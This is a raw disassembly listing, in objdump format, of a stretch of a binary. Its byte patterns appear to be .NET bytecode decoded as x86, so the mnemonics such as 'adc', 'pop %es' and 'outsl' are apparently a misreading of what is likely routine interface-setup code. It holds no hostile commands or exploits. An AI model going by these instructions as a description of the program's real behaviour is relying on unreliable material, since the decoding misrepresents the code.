100040e8:	0a 13                	or     (%ebx),%dl
100040ea:	07                   	pop    %es
100040eb:	28 47 00             	sub    %al,0x0(%edi)
100040ee:	00 0a                	add    %cl,(%edx)
100040f0:	13 08                	adc    (%eax),%ecx
100040f2:	12 07                	adc    (%edi),%al
100040f4:	28 48 00             	sub    %cl,0x0(%eax)
100040f7:	00 0a                	add    %cl,(%edx)
100040f9:	12 08                	adc    (%eax),%cl
100040fb:	28 48 00             	sub    %cl,0x0(%eax)
100040fe:	00 0a                	add    %cl,(%edx)
10004100:	59                   	pop    %ecx
10004101:	13 09                	adc    (%ecx),%ecx
10004103:	12 07                	adc    (%edi),%al
10004105:	28 49 00             	sub    %cl,0x0(%ecx)
10004108:	00 0a                	add    %cl,(%edx)
1000410a:	12 08                	adc    (%eax),%cl
1000410c:	28 49 00             	sub    %cl,0x0(%ecx)
1000410f:	00 0a                	add    %cl,(%edx)
10004111:	59                   	pop    %ecx
10004112:	13 0a                	adc    (%edx),%ecx
10004114:	12 07                	adc    (%edi),%al
10004116:	28 4a 00             	sub    %cl,0x0(%edx)
10004119:	00 0a                	add    %cl,(%edx)
1000411b:	13 0b                	adc    (%ebx),%ecx
1000411d:	12 07                	adc    (%edi),%al
1000411f:	28 4b 00             	sub    %cl,0x0(%ebx)
10004122:	00 0a                	add    %cl,(%edx)
10004124:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
10004127:	0a 11                	or     (%ecx),%dl
10004129:	0c 18                	or     $0x18,%al
1000412b:	5b                   	pop    %ebx
1000412c:	58                   	pop    %eax
1000412d:	13 0d 11 09 11 0b    	adc    0xb110911,%ecx
10004133:	18 5b 58             	sbb    %bl,0x58(%ebx)
10004136:	13 0e                	adc    (%esi),%ecx
10004138:	11 34 11             	adc    %esi,(%ecx,%edx,1)
1000413b:	06                   	push   %es
1000413c:	7d 22                	jge    0x10004160
1000413e:	00 00                	add    %al,(%eax)
10004140:	04 11                	add    $0x11,%al
10004142:	38 7b 18             	cmp    %bh,0x18(%ebx)
10004145:	00 00                	add    %al,(%eax)
10004147:	04 1f                	add    $0x1f,%al
10004149:	46                   	inc    %esi
1000414a:	1f                   	pop    %ds
1000414b:	46                   	inc    %esi
1000414c:	73 54                	jae    0x100041a2
1000414e:	00 00                	add    %al,(%eax)
10004150:	0a 6f 59             	or     0x59(%edi),%ch
10004153:	00 00                	add    %al,(%eax)
10004155:	0a 11                	or     (%ecx),%dl
10004157:	38 7b 18             	cmp    %bh,0x18(%ebx)
1000415a:	00 00                	add    %al,(%eax)
1000415c:	04 11                	add    $0x11,%al
1000415e:	0e                   	push   %cs
1000415f:	1f                   	pop    %ds
10004160:	23 59 11             	and    0x11(%ecx),%ebx
10004163:	0d 20 c8 00 00       	or     $0xc820,%eax
10004168:	00 59 73             	add    %bl,0x73(%ecx)
1000416b:	52                   	push   %edx
1000416c:	00 00                	add    %al,(%eax)
1000416e:	0a 6f 64             	or     0x64(%edi),%ch
10004171:	00 00                	add    %al,(%eax)
10004173:	0a 11                	or     (%ecx),%dl
10004175:	38 7b 18             	cmp    %bh,0x18(%ebx)
10004178:	00 00                	add    %al,(%eax)
1000417a:	04 28                	add    $0x28,%al
1000417c:	5a                   	pop    %edx
1000417d:	00 00                	add    %al,(%eax)
1000417f:	0a 6f 3a             	or     0x3a(%edi),%ch
10004182:	00 00                	add    %al,(%eax)
10004184:	0a 11                	or     (%ecx),%dl
10004186:	38 7b 18             	cmp    %bh,0x18(%ebx)
10004189:	00 00                	add    %al,(%eax)
1000418b:	04 11                	add    $0x11,%al
1000418d:	34 fe                	xor    $0xfe,%al
1000418f:	06                   	push   %es
10004190:	46                   	inc    %esi
10004191:	00 00                	add    %al,(%eax)
10004193:	06                   	push   %es
10004194:	73 5b                	jae    0x100041f1
10004196:	00 00                	add    %al,(%eax)
10004198:	0a 6f 5c             	or     0x5c(%edi),%ch
1000419b:	00 00                	add    %al,(%eax)
1000419d:	0a 7e 0e             	or     0xe(%esi),%bh
100041a0:	00 00                	add    %al,(%eax)
100041a2:	04 6f                	add    $0x6f,%al
100041a4:	5d                   	pop    %ebp
100041a5:	00 00                	add    %al,(%eax)
100041a7:	0a 11                	or     (%ecx),%dl
100041a9:	38 7b 18             	cmp    %bh,0x18(%ebx)
100041ac:	00 00                	add    %al,(%eax)
100041ae:	04 6f                	add    $0x6f,%al
100041b0:	5e                   	pop    %esi
100041b1:	00 00                	add    %al,(%eax)
100041b3:	0a 11                	or     (%ecx),%dl
100041b5:	38 7b 19             	cmp    %bh,0x19(%ebx)
100041b8:	00 00                	add    %al,(%eax)
100041ba:	04 11                	add    $0x11,%al
100041bc:	04 6f                	add    $0x6f,%al
100041be:	35 00 00 0a 11       	xor    $0x110a0000,%eax
100041c3:	38 7b 19             	cmp    %bh,0x19(%ebx)
100041c6:	00 00                	add    %al,(%eax)
100041c8:	04 11                	add    $0x11,%al
100041ca:	34 7b                	xor    $0x7b,%al
100041cc:	21 00                	and    %eax,(%eax)
100041ce:	00 04 6f             	add    %al,(%edi,%ebp,2)
100041d1:	3c 00                	cmp    $0x0,%al
100041d3:	00 0a                	add    %cl,(%edx)
100041d5:	11 38                	adc    %edi,(%eax)
100041d7:	7b 19                	jnp    0x100041f2
100041d9:	00 00                	add    %al,(%eax)
100041db:	04 72                	add    $0x72,%al
100041dd:	35 02 00 70 22       	xor    $0x22700002,%eax
100041e2:	00 00                	add    %al,(%eax)
100041e4:	28 42 17             	sub    %al,0x17(%edx)
100041e7:	73 65                	jae    0x1000424e
100041e9:	00 00                	add    %al,(%eax)
100041eb:	0a 6f 61             	or     0x61(%edi),%ch
100041ee:	00 00                	add    %al,(%eax)
100041f0:	0a 11                	or     (%ecx),%dl
100041f2:	38 7b 19             	cmp    %bh,0x19(%ebx)
100041f5:	00 00                	add    %al,(%eax)
100041f7:	04 16                	add    $0x16,%al
100041f9:	6f                   	outsl  %ds:(%esi),(%dx)
100041fa:	62 00                	bound  %eax,(%eax)
100041fc:	00 0a                	add    %cl,(%edx)
100041fe:	11 38                	adc    %edi,(%eax)
10004200:	7b 19                	jnp    0x1000421b
10004202:	00 00                	add    %al,(%eax)
10004204:	04 11                	add    $0x11,%al
10004206:	0b 1f                	or     (%edi),%ebx
10004208:	46                   	inc    %esi
10004209:	73 54                	jae    0x1000425f
1000420b:	00 00                	add    %al,(%eax)
1000420d:	0a 6f 59             	or     0x59(%edi),%ch
10004210:	00 00                	add    %al,(%eax)
10004212:	0a 11                	or     (%ecx),%dl
10004214:	38 7b 19             	cmp    %bh,0x19(%ebx)
10004217:	00 00                	add    %al,(%eax)
10004219:	04 11                	add    $0x11,%al
1000421b:	09 11                	or     %edx,(%ecx)
1000421d:	0d 1f 64 59 73       	or     $0x7359641f,%eax
10004222:	52                   	push   %edx
10004223:	00 00                	add    %al,(%eax)
10004225:	0a 6f 64             	or     0x64(%edi),%ch
10004228:	00 00                	add    %al,(%eax)
1000422a:	0a 11                	or     (%ecx),%dl
1000422c:	38 7b 19             	cmp    %bh,0x19(%ebx)
1000422f:	00 00                	add    %al,(%eax)
10004231:	04 1f                	add    $0x1f,%al
10004233:	20 6f 66             	and    %ch,0x66(%edi)
10004236:	00 00                	add    %al,(%eax)
10004238:	0a 11                	or     (%ecx),%dl
1000423a:	38 7b 19             	cmp    %bh,0x19(%ebx)
1000423d:	00 00                	add    %al,(%eax)
1000423f:	04 28                	add    $0x28,%al
10004241:	5a                   	pop    %edx
10004242:	00 00                	add    %al,(%eax)
10004244:	0a 6f 3a             	or     0x3a(%edi),%ch
10004247:	00 00                	add    %al,(%eax)
10004249:	0a 7e 0e             	or     0xe(%esi),%bh
1000424c:	00 00                	add    %al,(%eax)
1000424e:	04 6f                	add    $0x6f,%al
10004250:	5d                   	pop    %ebp
10004251:	00 00                	add    %al,(%eax)
10004253:	0a 11                	or     (%ecx),%dl
10004255:	38 7b 19             	cmp    %bh,0x19(%ebx)
10004258:	00 00                	add    %al,(%eax)
1000425a:	04 6f                	add    $0x6f,%al
1000425c:	5e                   	pop    %esi
1000425d:	00 00                	add    %al,(%eax)
1000425f:	0a 11                	or     (%ecx),%dl
10004261:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10004264:	00 00                	add    %al,(%eax)
10004266:	04 72                	add    $0x72,%al
10004268:	4d                   	dec    %ebp
10004269:	05 00 70 6f 35       	add    $0x356f7000,%eax
1000426e:	00 00                	add    %al,(%eax)
10004270:	0a 11                	or     (%ecx),%dl
10004272:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10004275:	00 00                	add    %al,(%eax)
10004277:	04 20                	add    $0x20,%al
10004279:	dc 00                	faddl  (%eax)
1000427b:	00 00                	add    %al,(%eax)
1000427d:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
10004280:	21 00                	and    %eax,(%eax)
10004282:	00 04 28             	add    %al,(%eax,%ebp,1)
10004285:	2c 00                	sub    $0x0,%al
10004287:	00 0a                	add    %cl,(%edx)
10004289:	6f                   	outsl  %ds:(%esi),(%dx)
1000428a:	3c 00                	cmp    $0x0,%al
1000428c:	00 0a                	add    %cl,(%edx)
1000428e:	11 38                	adc    %edi,(%eax)
10004290:	7b 1a                	jnp    0x100042ac
10004292:	00 00                	add    %al,(%eax)
10004294:	04 72                	add    $0x72,%al
10004296:	35 02 00 70 22       	xor    $0x22700002,%eax
1000429b:	00 00                	add    %al,(%eax)
1000429d:	80 41 73 60          	addb   $0x60,0x73(%ecx)
100042a1:	00 00                	add    %al,(%eax)
100042a3:	0a 6f 61             	or     0x61(%edi),%ch
100042a6:	00 00                	add    %al,(%eax)
100042a8:	0a 11                	or     (%ecx),%dl
100042aa:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
100042ad:	00 00                	add    %al,(%eax)
100042af:	04 16                	add    $0x16,%al
100042b1:	6f                   	outsl  %ds:(%esi),(%dx)
100042b2:	62 00                	bound  %eax,(%eax)
100042b4:	00 0a                	add    %cl,(%edx)
100042b6:	11 38                	adc    %edi,(%eax)
100042b8:	7b 1a                	jnp    0x100042d4
100042ba:	00 00                	add    %al,(%eax)
100042bc:	04 11                	add    $0x11,%al
100042be:	0b 1f                	or     (%edi),%ebx
100042c0:	23 73 54             	and    0x54(%ebx),%esi
100042c3:	00 00                	add    %al,(%eax)
100042c5:	0a 6f 59             	or     0x59(%edi),%ch
100042c8:	00 00                	add    %al,(%eax)
100042ca:	0a 11                	or     (%ecx),%dl
100042cc:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
100042cf:	00 00                	add    %al,(%eax)
100042d1:	04 11                	add    $0x11,%al
100042d3:	09 11                	or     %edx,(%ecx)
100042d5:	0d 1f 0a 59 73       	or     $0x73590a1f,%eax
100042da:	52                   	push   %edx
100042db:	00 00                	add    %al,(%eax)
100042dd:	0a 6f 64             	or     0x64(%edi),%ch
100042e0:	00 00                	add    %al,(%eax)
100042e2:	0a 11                	or     (%ecx),%dl
100042e4:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
100042e7:	00 00                	add    %al,(%eax)
100042e9:	04 1f                	add    $0x1f,%al
100042eb:	20 6f 66             	and    %ch,0x66(%edi)
100042ee:	00 00                	add    %al,(%eax)
100042f0:	0a 11                	or     (%ecx),%dl
100042f2:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
100042f5:	00 00                	add    %al,(%eax)
100042f7:	04 28                	add    $0x28,%al
100042f9:	5a                   	pop    %edx
100042fa:	00 00                	add    %al,(%eax)
100042fc:	0a 6f 3a             	or     0x3a(%edi),%ch
100042ff:	00 00                	add    %al,(%eax)
10004301:	0a 7e 0e             	or     0xe(%esi),%bh
10004304:	00 00                	add    %al,(%eax)
10004306:	04 6f                	add    $0x6f,%al
10004308:	5d                   	pop    %ebp
10004309:	00 00                	add    %al,(%eax)
1000430b:	0a 11                	or     (%ecx),%dl
1000430d:	38 7b 1a             	cmp    %bh,0x1a(%ebx)
10004310:	00 00                	add    %al,(%eax)
10004312:	04 6f                	add    $0x6f,%al
10004314:	5e                   	pop    %esi
10004315:	00 00                	add    %al,(%eax)
10004317:	0a 11                	or     (%ecx),%dl
10004319:	34 20                	xor    $0x20,%al
1000431b:	c2 01 00             	ret    $0x1
1000431e:	00 7d 23             	add    %bh,0x23(%ebp)
10004321:	00 00                	add    %al,(%eax)
10004323:	04 73                	add    $0x73,%al
10004325:	57                   	push   %edi
10004326:	00 00                	add    %al,(%eax)
10004328:	0a 13                	or     (%ebx),%dl
1000432a:	0f 11 0f             	movups %xmm1,(%edi)
1000432d:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
10004330:	23 00                	and    (%eax),%eax
10004332:	00 04 1c             	add    %al,(%esp,%ebx,1)
10004335:	73 54                	jae    0x1000438b
10004337:	00 00                	add    %al,(%eax)
10004339:	0a 6f 59             	or     0x59(%edi),%ch
1000433c:	00 00                	add    %al,(%eax)
1000433e:	0a 11                	or     (%ecx),%dl
10004340:	0f 11 0e             	movups %xmm1,(%esi)
10004343:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
10004346:	23 00                	and    (%eax),%eax
10004348:	00 04 18             	add    %al,(%eax,%ebx,1)
1000434b:	5b                   	pop    %ebx
1000434c:	59                   	pop    %ecx
1000434d:	11 0d 1f 28 58 73    	adc    %ecx,0x7358281f
10004353:	52                   	push   %edx
10004354:	00 00                	add    %al,(%eax)
10004356:	0a 6f 64             	or     0x64(%edi),%ch
10004359:	00 00                	add    %al,(%eax)
1000435b:	0a 11                	or     (%ecx),%dl
1000435d:	0f 1f 50 11          	nopl   0x11(%eax)
10004361:	34 7b                	xor    $0x7b,%al
10004363:	21 00                	and    %eax,(%eax)
10004365:	00 04 28             	add    %al,(%eax,%ebp,1)
10004368:	2c 00                	sub    $0x0,%al
1000436a:	00 0a                	add    %cl,(%edx)
1000436c:	6f                   	outsl  %ds:(%esi),(%dx)
1000436d:	3a 00                	cmp    (%eax),%al
1000436f:	00 0a                	add    %cl,(%edx)
10004371:	7e 0e                	jle    0x10004381
10004373:	00 00                	add    %al,(%eax)
10004375:	04 6f                	add    $0x6f,%al
10004377:	5d                   	pop    %ebp
10004378:	00 00                	add    %al,(%eax)
1000437a:	0a 11                	or     (%ecx),%dl
1000437c:	0f 6f 5e 00          	movq   0x0(%esi),%mm3
10004380:	00 0a                	add    %cl,(%edx)
10004382:	11 34 73             	adc    %esi,(%ebx,%esi,2)
10004385:	57                   	push   %edi
10004386:	00 00                	add    %al,(%eax)
10004388:	0a 7d 24             	or     0x24(%ebp),%bh
1000438b:	00 00                	add    %al,(%eax)
1000438d:	04 11                	add    $0x11,%al
1000438f:	34 7b                	xor    $0x7b,%al
10004391:	24 00                	and    $0x0,%al
10004393:	00 04 16             	add    %al,(%esi,%edx,1)
10004396:	1c 73                	sbb    $0x73,%al
10004398:	54                   	push   %esp
10004399:	00 00                	add    %al,(%eax)
1000439b:	0a 6f 59             	or     0x59(%edi),%ch
1000439e:	00 00                	add    %al,(%eax)
100043a0:	0a 11                	or     (%ecx),%dl
100043a2:	34 7b                	xor    $0x7b,%al
100043a4:	24 00                	and    $0x0,%al
100043a6:	00 04 16             	add    %al,(%esi,%edx,1)
100043a9:	16                   	push   %ss
100043aa:	73 52                	jae    0x100043fe
100043ac:	00 00                	add    %al,(%eax)
100043ae:	0a 6f 64             	or     0x64(%edi),%ch
100043b1:	00 00                	add    %al,(%eax)
100043b3:	0a 11                	or     (%ecx),%dl
100043b5:	34 7b                	xor    $0x7b,%al
100043b7:	24 00                	and    $0x0,%al
100043b9:	00 04 11             	add    %al,(%ecx,%edx,1)
100043bc:	34 7b                	xor    $0x7b,%al
100043be:	21 00                	and    %eax,(%eax)
100043c0:	00 04 6f             	add    %al,(%edi,%ebp,2)
100043c3:	3a 00                	cmp    (%eax),%al
100043c5:	00 0a                	add    %cl,(%edx)
100043c7:	11 0f                	adc    %ecx,(%edi)
100043c9:	6f                   	outsl  %ds:(%esi),(%dx)
100043ca:	5d                   	pop    %ebp
100043cb:	00 00                	add    %al,(%eax)
100043cd:	0a 11                	or     (%ecx),%dl
100043cf:	34 7b                	xor    $0x7b,%al
100043d1:	24 00                	and    $0x0,%al
100043d3:	00 04 6f             	add    %al,(%edi,%ebp,2)
100043d6:	5e                   	pop    %esi
100043d7:	00 00                	add    %al,(%eax)
100043d9:	0a 11                	or     (%ecx),%dl
100043db:	34 73                	xor    $0x73,%al
100043dd:	58                   	pop    %eax
100043de:	00 00                	add    %al,(%eax)
100043e0:	0a 7d 25             	or     0x25(%ebp),%bh
100043e3:	00 00                	add    %al,(%eax)
100043e5:	04 11                	add    $0x11,%al
100043e7:	34 7b                	xor    $0x7b,%al
100043e9:	25 00 00 04 72       	and    $0x72040000,%eax
100043ee:	7f 05                	jg     0x100043f5
100043f0:	00 70 6f             	add    %dh,0x6f(%eax)
100043f3:	35 00 00 0a 11       	xor    $0x110a0000,%eax
100043f8:	34 7b                	xor    $0x7b,%al
100043fa:	25 00 00 04 11       	and    $0x11040000,%eax
100043ff:	34 7b                	xor    $0x7b,%al
10004401:	21 00                	and    %eax,(%eax)
10004403:	00 04 6f             	add    %al,(%edi,%ebp,2)
10004406:	3c 00                	cmp    $0x0,%al
10004408:	00 0a                	add    %cl,(%edx)
1000440a:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
1000440d:	25 00 00 04 72       	and    $0x72040000,%eax
10004412:	35 02 00 70 22       	xor    $0x22700002,%eax
10004417:	00 00                	add    %al,(%eax)
10004419:	60                   	pusha
1000441a:	41                   	inc    %ecx
1000441b:	17                   	pop    %ss
1000441c:	73 65                	jae    0x10004483
1000441e:	00 00                	add    %al,(%eax)
10004420:	0a 6f 61             	or     0x61(%edi),%ch
10004423:	00 00                	add    %al,(%eax)
10004425:	0a 11                	or     (%ecx),%dl
10004427:	34 7b                	xor    $0x7b,%al
10004429:	25 00 00 04 16       	and    $0x16040000,%eax
1000442e:	6f                   	outsl  %ds:(%esi),(%dx)
1000442f:	62 00                	bound  %eax,(%eax)
10004431:	00 0a                	add    %cl,(%edx)
10004433:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
10004436:	25 00 00 04 11       	and    $0x11040000,%eax
1000443b:	0b 1f                	or     (%edi),%ebx
1000443d:	1e                   	push   %ds
1000443e:	73 54                	jae    0x10004494
10004440:	00 00                	add    %al,(%eax)
10004442:	0a 6f 59             	or     0x59(%edi),%ch
10004445:	00 00                	add    %al,(%eax)
10004447:	0a 11                	or     (%ecx),%dl
10004449:	34 7b                	xor    $0x7b,%al
1000444b:	25 00 00 04 11       	and    $0x11040000,%eax
10004450:	09 11                	or     %edx,(%ecx)
10004452:	0d 1f 37 58 73       	or     $0x7358371f,%eax
10004457:	52                   	push   %edx
10004458:	00 00                	add    %al,(%eax)
1000445a:	0a 6f 64             	or     0x64(%edi),%ch
1000445d:	00 00                	add    %al,(%eax)
1000445f:	0a 11                	or     (%ecx),%dl
10004461:	34 7b                	xor    $0x7b,%al
10004463:	25 00 00 04 1f       	and    $0x1f040000,%eax
10004468:	20 6f 66             	and    %ch,0x66(%edi)
1000446b:	00 00                	add    %al,(%eax)
1000446d:	0a 11                	or     (%ecx),%dl
1000446f:	34 7b                	xor    $0x7b,%al
10004471:	25 00 00 04 28       	and    $0x28040000,%eax
10004476:	5a                   	pop    %edx
10004477:	00 00                	add    %al,(%eax)
10004479:	0a 6f 3a             	or     0x3a(%edi),%ch
1000447c:	00 00                	add    %al,(%eax)
1000447e:	0a 7e 0e             	or     0xe(%esi),%bh
10004481:	00 00                	add    %al,(%eax)
10004483:	04 6f                	add    $0x6f,%al
10004485:	5d                   	pop    %ebp
10004486:	00 00                	add    %al,(%eax)
10004488:	0a 11                	or     (%ecx),%dl
1000448a:	34 7b                	xor    $0x7b,%al
1000448c:	25 00 00 04 6f       	and    $0x6f040000,%eax
10004491:	5e                   	pop    %esi
10004492:	00 00                	add    %al,(%eax)
10004494:	0a 11                	or     (%ecx),%dl
10004496:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10004499:	00 00                	add    %al,(%eax)
1000449b:	04 72                	add    $0x72,%al
1000449d:	85 05 00 70 6f 35    	test   %eax,0x356f7000
100044a3:	00 00                	add    %al,(%eax)
100044a5:	0a 11                	or     (%ecx),%dl
100044a7:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
100044aa:	00 00                	add    %al,(%eax)
100044ac:	04 20                	add    $0x20,%al
100044ae:	b4 00                	mov    $0x0,%ah
100044b0:	00 00                	add    %al,(%eax)
100044b2:	11 34 7b             	adc    %esi,(%ebx,%edi,2)
100044b5:	21 00                	and    %eax,(%eax)
100044b7:	00 04 28             	add    %al,(%eax,%ebp,1)
100044ba:	2c 00                	sub    $0x0,%al
100044bc:	00 0a                	add    %cl,(%edx)
100044be:	6f                   	outsl  %ds:(%esi),(%dx)
100044bf:	3c 00                	cmp    $0x0,%al
100044c1:	00 0a                	add    %cl,(%edx)
100044c3:	11 38                	adc    %edi,(%eax)
100044c5:	7b 1b                	jnp    0x100044e2
100044c7:	00 00                	add    %al,(%eax)
100044c9:	04 72                	add    $0x72,%al
100044cb:	35 02 00 70 22       	xor    $0x22700002,%eax
100044d0:	00 00                	add    %al,(%eax)
100044d2:	20 41 73             	and    %al,0x73(%ecx)
100044d5:	60                   	pusha
100044d6:	00 00                	add    %al,(%eax)
100044d8:	0a 6f 61             	or     0x61(%edi),%ch
100044db:	00 00                	add    %al,(%eax)
100044dd:	0a 11                	or     (%ecx),%dl
100044df:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
100044e2:	00 00                	add    %al,(%eax)
100044e4:	04 16                	add    $0x16,%al
100044e6:	6f                   	outsl  %ds:(%esi),(%dx)
100044e7:	62 00                	bound  %eax,(%eax)
100044e9:	00 0a                	add    %cl,(%edx)
100044eb:	11 38                	adc    %edi,(%eax)
100044ed:	7b 1b                	jnp    0x1000450a
100044ef:	00 00                	add    %al,(%eax)
100044f1:	04 11                	add    $0x11,%al
100044f3:	0b 1f                	or     (%edi),%ebx
100044f5:	19 73 54             	sbb    %esi,0x54(%ebx)
100044f8:	00 00                	add    %al,(%eax)
100044fa:	0a 6f 59             	or     0x59(%edi),%ch
100044fd:	00 00                	add    %al,(%eax)
100044ff:	0a 11                	or     (%ecx),%dl
10004501:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10004504:	00 00                	add    %al,(%eax)
10004506:	04 11                	add    $0x11,%al
10004508:	09 11                	or     %edx,(%ecx)
1000450a:	0d 1f 5f 58 73       	or     $0x73585f1f,%eax
1000450f:	52                   	push   %edx
10004510:	00 00                	add    %al,(%eax)
10004512:	0a 6f 64             	or     0x64(%edi),%ch
10004515:	00 00                	add    %al,(%eax)
10004517:	0a 11                	or     (%ecx),%dl
10004519:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
1000451c:	00 00                	add    %al,(%eax)
1000451e:	04 1f                	add    $0x1f,%al
10004520:	20 6f 66             	and    %ch,0x66(%edi)
10004523:	00 00                	add    %al,(%eax)
10004525:	0a 11                	or     (%ecx),%dl
10004527:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
1000452a:	00 00                	add    %al,(%eax)
1000452c:	04 28                	add    $0x28,%al
1000452e:	5a                   	pop    %edx
1000452f:	00 00                	add    %al,(%eax)
10004531:	0a 6f 3a             	or     0x3a(%edi),%ch
10004534:	00 00                	add    %al,(%eax)
10004536:	0a 7e 0e             	or     0xe(%esi),%bh
10004539:	00 00                	add    %al,(%eax)
1000453b:	04 6f                	add    $0x6f,%al
1000453d:	5d                   	pop    %ebp
1000453e:	00 00                	add    %al,(%eax)
10004540:	0a 11                	or     (%ecx),%dl
10004542:	38 7b 1b             	cmp    %bh,0x1b(%ebx)
10004545:	00 00                	add    %al,(%eax)
10004547:	04 6f                	add    $0x6f,%al
10004549:	5e                   	pop    %esi
1000454a:	00 00                	add    %al,(%eax)
1000454c:	0a 73 58             	or     0x58(%ebx),%dh
1000454f:	00 00                	add    %al,(%eax)
10004551:	0a 13                	or     (%ebx),%dl
10004553:	10 11                	adc    %dl,(%ecx)
10004555:	10 28                	adc    %ch,(%eax)
10004557:	67 00 00             	add    %al,(%bx,%si)
1000455a:	0a 72 c7             	or     -0x39(%edx),%dh
1000455d:	05 00 70 28 68       	add    $0x68287000,%eax
10004562:	00 00                	add    %al,(%eax)
10004564:	0a 28                	or     (%eax),%ch
10004566:	44                   	inc    %esp
10004567:	00 00                	add    %al,(%eax)
10004569:	0a 6f 35             	or     0x35(%edi),%ch
1000456c:	00 00                	add    %al,(%eax)
1000456e:	0a 11                	or     (%ecx),%dl
10004570:	10 1f                	adc    %bl,(%edi)
10004572:	78 11                	js     0x10004585
10004574:	34 7b                	xor    $0x7b,%al
10004576:	21 00                	and    %eax,(%eax)
10004578:	00 04 28             	add    %al,(%eax,%ebp,1)
1000457b:	2c 00                	sub    $0x0,%al
1000457d:	00 0a                	add    %cl,(%edx)
1000457f:	6f                   	outsl  %ds:(%esi),(%dx)
10004580:	3c 00                	cmp    $0x0,%al
10004582:	00 0a                	add    %cl,(%edx)
10004584:	11 10                	adc    %edx,(%eax)
10004586:	72 35                	jb     0x100045bd
10004588:	02 00                	add    (%eax),%al
1000458a:	70 22                	jo     0x100045ae
1000458c:	00 00                	add    %al,(%eax)
1000458e:	10 41 73             	adc    %al,0x73(%ecx)
10004591:	60                   	pusha
10004592:	00 00                	add    %al,(%eax)
10004594:	0a 6f 61             	or     0x61(%edi),%ch
10004597:	00 00                	add    %al,(%eax)
10004599:	0a 11                	or     (%ecx),%dl
1000459b:	10 16                	adc    %dl,(%esi)
1000459d:	6f                   	outsl  %ds:(%esi),(%dx)
1000459e:	62 00                	bound  %eax,(%eax)
100045a0:	00 0a                	add    %cl,(%edx)
100045a2:	11 10                	adc    %edx,(%eax)
100045a4:	11 0b                	adc    %ecx,(%ebx)
100045a6:	1f                   	pop    %ds
100045a7:	14 73                	adc    $0x73,%al
100045a9:	54                   	push   %esp
100045aa:	00 00                	add    %al,(%eax)
100045ac:	0a 6f 59             	or     0x59(%edi),%ch
100045af:	00 00                	add    %al,(%eax)
100045b1:	0a 11                	or     (%ecx),%dl
100045b3:	10 16                	adc    %dl,(%esi)
100045b5:	11 0d 20 82 00 00    	adc    %ecx,0x8220
100045bb:	00 58 73             	add    %bl,0x73(%eax)
100045be:	52                   	push   %edx
100045bf:	00 00                	add    %al,(%eax)
100045c1:	0a 6f 64             	or     0x64(%edi),%ch
100045c4:	00 00                	add    %al,(%eax)
100045c6:	0a 11                	or     (%ecx),%dl
100045c8:	10 1f                	adc    %bl,(%edi)
100045ca:	20 6f 66             	and    %ch,0x66(%edi)
100045cd:	00 00                	add    %al,(%eax)
100045cf:	0a 11                	or     (%ecx),%dl
100045d1:	10 28                	adc    %ch,(%eax)
100045d3:	5a                   	pop    %edx
100045d4:	00 00                	add    %al,(%eax)
100045d6:	0a 6f 3a             	or     0x3a(%edi),%ch
100045d9:	00 00                	add    %al,(%eax)
100045db:	0a 7e 0e             	or     0xe(%esi),%bh
100045de:	00 00                	add    %al,(%eax)
100045e0:	04 6f                	add    $0x6f,%al
100045e2:	5d                   	pop    %ebp
100045e3:	00 00                	add    %al,(%eax)
100045e5:	0a 11                	or     (%ecx),%dl
100045e7:	10 6f 5e             	adc    %ch,0x5e(%edi)
100045ea:	00 00                	add    %al,(%eax)
100045ec:	0a 11                	or     (%ecx),%dl
100045ee:	34 1f                	xor    $0x1f,%al
100045f0:	0a 8d 11 00 00 01    	or     0x1000011(%ebp),%cl
100045f6:	13 3b                	adc    (%ebx),%edi
100045f8:	11 3b                	adc    %edi,(%ebx)
100045fa:	16                   	push   %ss
100045fb:	72 85                	jb     0x10004582
100045fd:	05 00 70 a2 11       	add    $0x11a27000,%eax
10004602:	3b 17                	cmp    (%edi),%edx
10004604:	72 cf                	jb     0x100045d5
10004606:	05 00 70 a2 11       	add    $0x11a27000,%eax
1000460b:	3b 18                	cmp    (%eax),%ebx
1000460d:	72 19                	jb     0x10004628
1000460f:	06                   	push   %es
10004610:	00 70 a2             	add    %dh,-0x5e(%eax)
10004613:	11 3b                	adc    %edi,(%ebx)
10004615:	19 72 63             	sbb    %esi,0x63(%edx)
10004618:	06                   	push   %es
10004619:	00 70 a2             	add    %dh,-0x5e(%eax)
1000461c:	11 3b                	adc    %edi,(%ebx)
1000461e:	1a 72 a3             	sbb    -0x5d(%edx),%dh
10004621:	06                   	push   %es
10004622:	00 70 a2             	add    %dh,-0x5e(%eax)
10004625:	11 3b                	adc    %edi,(%ebx)
10004627:	1b 72 dd             	sbb    -0x23(%edx),%esi
1000462a:	06                   	push   %es
1000462b:	00 70 a2             	add    %dh,-0x5e(%eax)
1000462e:	11 3b                	adc    %edi,(%ebx)
10004630:	1c 72                	sbb    $0x72,%al
10004632:	0b 07                	or     (%edi),%eax
10004634:	00 70 a2             	add    %dh,-0x5e(%eax)
10004637:	11 3b                	adc    %edi,(%ebx)
10004639:	1d 72 57 07 00       	sbb    $0x75772,%eax
1000463e:	70 a2                	jo     0x100045e2
10004640:	11 3b                	adc    %edi,(%ebx)
10004642:	1e                   	push   %ds
10004643:	72 a5                	jb     0x100045ea
10004645:	07                   	pop    %es
10004646:	00 70 a2             	add    %dh,-0x5e(%eax)
10004649:	11 3b                	adc    %edi,(%ebx)
1000464b:	1f                   	pop    %ds
1000464c:	09 72 db             	or     %esi,-0x25(%edx)
1000464f:	07                   	pop    %es
10004650:	00 70 a2             	add    %dh,-0x5e(%eax)
10004653:	11 3b                	adc    %edi,(%ebx)
10004655:	7d 26                	jge    0x1000467d
10004657:	00 00                	add    %al,(%eax)
10004659:	04 11                	add    $0x11,%al
1000465b:	34 16                	xor    $0x16,%al
1000465d:	7d 27                	jge    0x10004686
